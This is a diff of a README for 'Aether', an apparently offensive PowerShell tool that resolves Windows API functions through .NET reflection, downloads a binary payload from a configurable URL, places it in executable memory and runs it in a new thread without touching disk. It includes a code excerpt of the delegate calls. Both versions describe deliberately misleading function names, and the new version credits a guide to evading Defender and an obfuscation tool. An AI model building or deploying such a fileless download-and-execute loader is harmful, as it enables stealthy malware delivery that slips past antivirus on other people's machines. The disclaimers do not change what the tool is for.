@@ -1,38 +1,35 @@
 # Aether
 
-Aether is a PowerShell script that uses .NET reflection to call Windows API functions on the fly and run code directly from memory. It’s a practical example of how you can use PowerShell to dynamically load and execute payloads without touching disk.
+Aether is a PowerShell script that demonstrates dynamic API resolution and in-memory payload execution using .NET reflection. It dynamically finds Windows API functions, builds delegates at runtime, downloads a payload, allocates executable memory, and runs the payload in a new thread without ever touching disk.
 
-## What it does
+## What It Does
 
-- Finds Windows API functions like `VirtualAlloc` and `CreateThread` by searching through loaded .NET assemblies, not by standard P/Invoke.
-- Builds delegates at runtime, allowing managed PowerShell code to call these low-level functions.
-- Downloads a binary payload from a URL, puts it in memory, and runs it in a new thread.
-- Uses intentionally odd variable names (like “potatoes” and “apples”) to keep things interesting and less obvious at first glance.
+- Locates Windows API functions like `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject` by searching loaded .NET assemblies instead of static imports.
+- Creates delegates on the fly to match API function signatures using reflection emit.
+- Downloads a binary payload from a URL, allocates RWX memory, copies the payload, and executes it in a new thread.
+- Uses funny variable and function names like `potatoes` and `apples` to make code analysis a bit more entertaining (and less obvious).
 
-## How to use
+## Usage
 
-**Fair Warning:** This script executes arbitrary code and may trigger antivirus or EDR solutions. Use it for learning, research, or red/purple team labs—never on unauthorized systems.
+**Warning:** This script executes arbitrary code in memory and will likely trigger AV/EDR. Only use it in a safe lab environment or with explicit permission.
 
-1. Set the `$url` variable in the script to point to your payload (must be a raw binary).
-2. Run the script in PowerShell. Admin rights may be needed, depending on what your payload does.
+1. Change the `$url` variable to your payload's direct download link.
+2. Run the script in PowerShell. Admin rights may be needed for some payloads.
 
 ```powershell
-$url = "https://your-server.com/payload.bin"   # <--- Change this
+$url = "https://your-server.com/payload.bin"
 # ...rest of the script...
 ```
 
-## How it works (in plain English)
+## How It Works
 
-- **API Lookup:** The function `potatoes` finds the address of Windows API functions (like `VirtualAlloc`) using .NET internals.
-- **Delegate Generation:** The function `apples` creates the right .NET delegate type at runtime, matching the function’s signature.
-- **Payload Download:** The script grabs your payload from the internet and saves it in a byte array.
-- **Memory Allocation:** It uses `VirtualAlloc` to reserve memory with execute permissions.
-- **Copy and Go:** The binary is copied into the allocated memory, then a new thread is created at that address.
-- **Wait:** The script waits for the thread (your payload) to finish running.
+- **API Lookup:** The `potatoes` function finds the address of Windows API functions using .NET internals.
+- **Delegate Generation:** The `apples` function creates the right .NET delegate type at runtime for the API function pointers.
+- **Payload Download:** Downloads your binary payload and stores it in a byte array.
+- **Memory Allocation:** Uses `VirtualAlloc` to reserve executable memory.
+- **Payload Execution:** Copies the payload into memory, spawns a new thread with `CreateThread`, and waits for it to finish.
 
 ## Example
-
-Here’s a rough step-by-step from the script:
 
 ```powershell
 $virtualAllocPtr = potatoes kernel32.dll VirtualAlloc
@@ -53,19 +50,16 @@ $waitForSingleObjectDelegate = [System.Runtime.InteropServices.Marshal]::GetDele
 $waitResult = $waitForSingleObjectDelegate.Invoke($thread, 0xFFFFFFFF)
 ```
 
-## What’s the point?
+## Credits
 
-Mainly, Aether is for:
-
-- Showing how to use .NET reflection to avoid static API imports.
-- Demonstrating in-memory execution of payloads.
-- Learning more about Windows internals and PowerShell’s power (and risks).
+- Big thanks to [this excellent article by @luisgerardomoret](https://medium.com/@luisgerardomoret_69654/making-a-powershell-shellcode-downloader-that-evades-defender-without-amsi-bypass-d2cf13f18409) for the original inspiration and technical breakdown.
+- For PowerShell obfuscation and more, check out [@KingKDot/PowerCrypt](https://github.com/KingKDot/PowerCrypt).
 
 ## License
 
-MIT License.
+MIT License
 
 ---
 
 **Disclaimer:**  
-This is for educational use only. Don’t use it for anything shady or on machines you don’t have explicit permission to test.
+This code is for educational and research purposes only. Don’t run it anywhere you don’t have permission. The author is not responsible for misuse.
